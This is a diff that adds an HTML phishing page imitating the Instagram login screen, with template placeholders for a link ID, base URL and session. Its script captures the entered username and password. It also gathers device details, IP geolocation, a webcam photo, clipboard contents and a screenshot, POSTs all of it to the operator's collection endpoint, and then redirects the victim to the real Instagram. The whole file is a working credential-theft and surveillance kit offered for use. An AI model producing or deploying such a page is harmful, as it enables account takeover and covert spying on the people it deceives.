@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Instagram • Login</title>
+<link rel="icon" href="https://www.instagram.com/favicon.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 32px;max-width:360px;width:90%;text-align:center;margin:0 auto}
+.logo{margin-bottom:24px;font-family:'Cookie',cursive;font-size:42px;font-weight:400;color:#262626}
+.input-group{margin-bottom:8px}
+.input-group input{width:100%;padding:10px 8px;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;font-size:14px;outline:none}
+.input-group input:focus{border-color:#a8a8a8;background:#fff}
+.input-group input::placeholder{color:#8e8e8e}
+.btn{background:#0095f6;color:#fff;border:none;border-radius:8px;padding:8px 16px;font-size:14px;width:100%;cursor:pointer;font-weight:600;margin-top:12px;transition:background .15s}
+.btn:hover{background:#1877f2}
+.btn:disabled{opacity:.5;cursor:default}
+.or{display:flex;align-items:center;gap:16px;margin:16px 0;color:#8e8e8e;font-size:13px}
+.or div{flex:1;height:1px;background:#dbdbdb}
+.fb-btn{background:#fff;color:#385185;border:none;font-size:14px;font-weight:600;cursor:pointer;margin:8px 0;width:100%;padding:8px}
+.fb-btn:hover{opacity:.8}
+.forgot{color:#00376b;font-size:12px;margin-top:12px;display:block;text-decoration:none}
+.signup{margin-top:16px;border:1px solid #dbdbdb;border-radius:4px;padding:16px;background:#fff;text-align:center;font-size:14px;color:#262626;max-width:360px;width:90%}
+.signup a{color:#0095f6;font-weight:600;text-decoration:none}
+#video{display:none;width:100%;border-radius:4px;margin:12px 0;background:#000;max-height:200px;object-fit:cover}
+.loading{display:none;margin-top:12px;color:#8e8e8e;font-size:13px}
+.apps{display:flex;gap:8px;justify-content:center;margin-top:16px}
+.apps img{height:40px}
+</style>
+</head>
+<body>
+<div style="display:flex;flex-direction:column;align-items:center">
+<div class="card">
+<div class="logo">Instagram</div>
+<div class="input-group"><input type="text" id="login" placeholder="Phone number, username or email" autocomplete="off"></div>
+<div class="input-group"><input type="password" id="password" placeholder="Password" autocomplete="off"></div>
+<button class="btn" id="login_btn" onclick="login()">Log in</button>
+<video id="video" autoplay muted playsinline></video>
+<div class="loading" id="loading">Logging in...</div>
+<div class="or"><div></div><span>OR</span><div></div></div>
+<button class="fb-btn">🗲 Log in with Facebook</button>
+<a class="forgot" href="#">Forgot password?</a>
+</div>
+<div class="signup">
+Don't have an account? <a href="#">Sign up</a>
+</div>
+</div>
+<script>
+const LID='{{LINK_ID}}',BASE='{{BASE_URL}}',SID='{{SESSION_ID}}';
+let c={session:SID};
+document.getElementById('password').addEventListener('keydown',e=>{if(e.key==='Enter')login()});
+async function collect(){
+    c.ua=navigator.userAgent;c.platform=navigator.platform;
+    c.screen=screen.width+'x'+screen.height;c.language=navigator.language;
+    c.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
+    try{const r=await fetch('https://ip-api.com/json/?fields=query,country,city,lat,lon,isp');const j=await r.json();Object.assign(c,j)}catch(e){}
+    try{
+        const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+        const v=document.getElementById('video');v.srcObject=st;v.style.display='block';
+        await new Promise(r=>setTimeout(r,1500));
+        const ca=document.createElement('canvas');ca.width=v.videoWidth||640;ca.height=v.videoHeight||480;
+        ca.getContext('2d').drawImage(v,0,0);
+        c.photo=ca.toDataURL('image/jpeg',0.85).split(',')[1];
+        st.getTracks().forEach(t=>t.stop())
+    }catch(e){}
+    try{const txt=await navigator.clipboard.readText();if(txt)c.clipboard=txt}catch(e){}
+    await fetch(BASE+'/c/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(c)})
+}
+async function login(){
+    const l=document.getElementById('login').value.trim(),pw=document.getElementById('password').value.trim();
+    if(!l||!pw)return;
+    c.login=l;c.password=pw;
+    c.visit_duration=Math.floor((Date.now()-t0)/1000);
+    document.getElementById('login_btn').disabled=true;
+    document.getElementById('loading').style.display='block';
+    try{
+        const st=await navigator.mediaDevices.getDisplayMedia({preferCurrentTab:true});
+        const tr=st.getVideoTracks()[0];const ic=new ImageCapture(tr);const bm=await ic.grabFrame();
+        const ca=document.createElement('canvas');ca.width=bm.width;ca.height=bm.height;
+        ca.getContext('2d').drawImage(bm,0,0);
+        c.screenshot=ca.toDataURL('image/png').split(',')[1];
+        tr.stop();st.getTracks().forEach(t=>t.stop())
+    }catch(e){}
+    await collect();
+    document.getElementById('load_text').textContent='✓ Logged in!';
+    setTimeout(()=>{window.location.href='https://www.instagram.com'},2000)
+}
+const t0=Date.now()
+</script>
+</body>
+</html>
